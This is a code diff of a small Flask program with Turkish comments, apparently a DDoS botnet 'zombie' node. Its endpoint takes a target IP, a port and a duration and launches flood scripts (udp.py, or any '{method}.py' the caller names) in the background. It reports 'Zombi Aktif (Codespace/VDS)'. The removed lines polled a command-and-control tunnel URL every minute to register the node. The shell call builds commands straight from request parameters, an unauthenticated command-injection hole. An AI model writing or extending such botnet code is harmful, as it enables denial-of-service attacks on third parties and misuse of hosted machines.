@@ -1,9 +1,5 @@
-import os, requests, threading, time
+import os
 from flask import Flask, request
-
-# --- AYARLAR ---
-# Buraya her zaman ssh terminalindeki GÜNCEL linki yapıştır kanka
-BEYIN_URL = "https://d6dc63ffd0cbfb.lhr.life"
 
 app = Flask(__name__)
 
@@ -12,17 +8,18 @@ def fire():
     target = request.args.get('ip')
     port = request.args.get('port')
     sure = request.args.get('time')
-    os.system(f"nohup python3 udp.py {target} {port} 3 {sure} > /dev/null 2>&1 &")
-    return "OK", 200
+    method = request.args.get('method') # Beyinden gelen method adı
+    
+    # Method ismine göre ilgili dosyayı çalıştırır
+    # Örn: voxility yazarsan voxility.py'yi ateşler
+    if method:
+        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
+        return f"Saldırı başladı: {method}", 200
+    return "Method belirtilmedi", 400
 
-def register():
-    while True:
-        try:
-            requests.get(f"{BEYIN_URL}/kayit?port=8080", timeout=10)
-        except:
-            pass
-        time.sleep(60)
+@app.route('/liste')
+def liste():
+    return "Zombi Aktif (Codespace/VDS)"
 
 if __name__ == '__main__':
-    threading.Thread(target=register, daemon=True).start()
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=8080)
